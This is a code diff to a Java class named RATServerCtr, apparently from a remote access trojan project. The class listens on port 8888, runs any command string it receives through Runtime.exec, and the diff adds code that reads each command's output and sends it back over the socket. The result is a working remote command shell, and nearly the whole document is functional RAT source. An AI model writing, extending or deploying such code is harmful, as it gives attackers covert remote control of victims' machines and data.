@@ -1,12 +1,17 @@
 package controllers;
 
+import java.io.BufferedReader;
 import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.ObjectOutputStream;
+import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.Arrays;
 import views.RATServerView;
 
 /**
@@ -18,6 +23,7 @@ public class RATServerCtr {
     private String host;
     private ServerSocket myServer;
     private ArrayList<Socket> list;
+    private static Socket s;
 
     public RATServerCtr() {
         port = 8888;
@@ -26,7 +32,7 @@ public class RATServerCtr {
         openSocket();
         while(true) {
             try {
-                Socket s = myServer.accept();
+                s = myServer.accept();
                 list.add(s);
                 execute(s);
             } catch (Exception e) {
@@ -81,10 +87,27 @@ public class RATServerCtr {
         return input;
     }
     
+    public void CommandRes(String res) {
+        try {
+            OutputStream ops = s.getOutputStream();
+            DataOutputStream dos = new DataOutputStream(ops);
+            dos.writeUTF(res);
+            dos.flush();
+        } catch (Exception e) {
+        }
+    }
+    
     public void commandHandler(String command) throws IOException {
         String c = command;
         try {
-            Runtime.getRuntime().exec(c);
+            String line = null;
+            Process proc = Runtime.getRuntime().exec(c);
+            BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            while((line = input.readLine()) != null) {
+                CommandRes(Arrays.toString(line.split("\s+")));
+                System.out.println(Arrays.toString(line.split("\s+")));
+            }
+            input.close();
         } catch (Exception e) {
             e.printStackTrace();
         }
